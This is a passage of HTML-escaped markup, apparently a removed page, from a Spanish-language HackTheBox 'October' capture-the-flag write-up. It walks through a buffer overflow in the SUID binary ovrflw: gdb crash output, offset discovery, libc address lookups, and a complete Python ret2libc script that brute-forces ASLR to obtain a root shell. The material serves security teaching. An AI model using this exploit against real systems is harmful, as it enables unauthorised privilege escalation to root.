-A%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsI
-AseAs4AsJAsfAs5AsKAsgAs6A'&lt;/span&gt;                                                                                                       
-                                                                                                                                 
-Program received signal SIGSEGV, Segmentation fault.                                                                             
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;----------------------------------registers-----------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                                                 
-EAX: 0x0 
-EBX: 0xb7783000 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x1abda8 
-ECX: 0xbfcdfe70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;As5AsKAsgAs6A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-EDX: 0xbfcddc73 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;As5AsKAsgAs6A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ESI: 0x0 
-EDI: 0x0 
-EBP: 0x6941414d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'MAAi'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ESP: 0xbfcddb00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-EIP: 0x41384141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'AA8A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-EFLAGS: 0x10202 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;carry parity adjust zero sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------------------------------------code-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-Invalid &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt; address: 0x41384141
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------stack-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-0000| 0xbfcddb00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0004| 0xbfcddb04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0008| 0xbfcddb08 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0012| 0xbfcddb0c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%O&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0016| 0xbfcddb10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0020| 0xbfcddb14 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0024| 0xbfcddb18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%Q&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0028| 0xbfcddb1c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x41384141 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora, tomamos la última dirección que se nos muestra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41384141 in ?? ()&lt;/code&gt; y ocupamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_offset&lt;/code&gt; para determinar la longitud del buffer antes de que se cambien los registros.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pattern_offset 0x41384141
-1094205761 found at offset: 112
-gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para este caso, vemos que el buffer tiene un tamaño de 112; es decir,  que la longitud de caracteres antes de modificar el valor del registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp&lt;/code&gt; es de 112. Para modificar el valor del registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eip&lt;/code&gt; es el buffer(112) + ebp(4).&lt;/p&gt;
-
-&lt;p&gt;Checando las librerías compartidas del programa, vemos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/local/bin/ovrflw
-        linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77fe000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7644000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        /lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x8003c000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-www-data@october:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En este caso, tenemos &lt;strong&gt;libc&lt;/strong&gt;, por lo que debemos ya estar pensando en un &lt;strong&gt;&lt;em&gt;Ret2libc&lt;/em&gt;&lt;/strong&gt;, que es una técnica que se basa en ejecutar código que no se encuentra en la pila sino en un sector de la memoria de libc, que es ejecutable; es decir, el código utilizado para vulnerar el programa son funciones dentro de esta librería.&lt;/p&gt;
-
-&lt;p&gt;Una forma de ver el ASLR es ejecutando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd&lt;/code&gt; y podemos ver como las direcciones van cambiando, pero hay que tener en cuenta que las direcciones se repiten de forma aleatoria; esto es un punto importante que debemos tener en cuenta para la explotación del &lt;em&gt;Buffer Overflow&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/local/bin/ovrflw
-        linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb777b000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb75c1000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        /lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x80050000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/local/bin/ovrflw
-        linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7781000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb75c7000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        /lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x800dc000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-www-data@october:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1 1000&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ldd /usr/local/bin/ovrflw&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;libc | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'NF{print $NF}'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'()'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;0xb75c7000
-0xb75c7000
-0xb75c7000
-www-data@october:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora, para nuestro script de &lt;em&gt;buffer overflow&lt;/em&gt; debemos tener presente la siguiente secuencia de envío de datos:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-october/october-ret2libc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Junk: Los datos a introducir que llenan el buffer, para este caso son 112 caracteres.&lt;/li&gt;
-  &lt;li&gt;Payload: Llamada a la librería &lt;em&gt;libc&lt;/em&gt; la cual cuenta con funciones útiles. Esta se divide en tres partes:
-    &lt;ul&gt;
-      &lt;li&gt;System address: La dirección de la llamada a la función system.&lt;/li&gt;
-      &lt;li&gt;Exit address: La dirección del código de estado.&lt;/li&gt;
-      &lt;li&gt;Binario address: La dirección de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; que utilizaremos para que &lt;strong&gt;root&lt;/strong&gt; nos la ejecute.&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Debido a que se está aplicando ASLR, debemos obtener la dirección base de &lt;em&gt;libc&lt;/em&gt; que para este caso será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xb75c7000&lt;/code&gt; (este valor se obtiene ejecutando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd&lt;/code&gt;). Ahora debemos de obtener las direciones de las funciones &lt;em&gt;system address&lt;/em&gt; y &lt;em&gt;exit address&lt;/em&gt; a la librería &lt;em&gt;libc&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;system|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;exit&quot;&lt;/span&gt;
-   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@@GLIBC_2.0
-  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
-www-data@october:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Por útimo nos falta la dirección de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; de la librería &lt;em&gt;libc&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; x /lib/i386-linux-gnu/libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;           
- 162bac /bin/sh
-www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Retomando todo lo anterior, tenemos lo siguiente:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;offset = 112&lt;/li&gt;
-  &lt;li&gt;base_libc = 0xb75c7000&lt;/li&gt;
-  &lt;li&gt;junk = “A”*offset&lt;/li&gt;
-  &lt;li&gt;system_addr_offset = 0x00040310&lt;/li&gt;
-  &lt;li&gt;exit_addr_offset = 0x00033260&lt;/li&gt;
-  &lt;li&gt;bin_sh_addr_offset = 0x00162bac&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Debido al ASLR, para calcular las direcciones reales para cuando &lt;em&gt;base_libc&lt;/em&gt; vale &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xb75c7000&lt;/code&gt; tenemos que sumarles dicho valor a los &lt;em&gt;offsets&lt;/em&gt; de la funciones:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;system_addr = base_libc + system_addr_offset&lt;/li&gt;
-  &lt;li&gt;exit_addr = base_libc + exit_addr_offset&lt;/li&gt;
-  &lt;li&gt;bin_sh_addr = base_libc + bin_sh_addr_offset&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Y el valor del payload completo sería:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;payload = junk + system_addr + exit_addr + bin_sh_addr&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Ahora si, con todo esto, ya podemos armar nuestro programa en python:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
-&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;base_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb75c7000&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;
-
-        &lt;span class=&quot;c1&quot;&gt;# ret2libc -&amp;gt; system_addr + exit_addr + bin_sh_addr
-&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;system_addr_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00040310&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;exit_addr_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00033260&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;bin_sh_addr_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00162bac&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_addr_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;bin_sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bin_sh_addr_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bin_sh_addr&lt;/span&gt;
-
-        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/local/bin/ovrflw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;
-                        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como el programa tiene permisos SUID, podemos ejecutarlo temporalmente como el propietario, en este caso &lt;strong&gt;root&lt;/strong&gt;. Ejecutamos el script que hicimos y tenemos que esperar a que el valor de &lt;em&gt;libc&lt;/em&gt; sea el que nosotros le indicamos; para este caso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xb75c7000&lt;/code&gt;. En caso de que llevemos un buen rato y no vemos el símbolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, podríamos probar con otro valor de &lt;em&gt;libc&lt;/em&gt; sin alterar el programa.&lt;/p&gt;
-
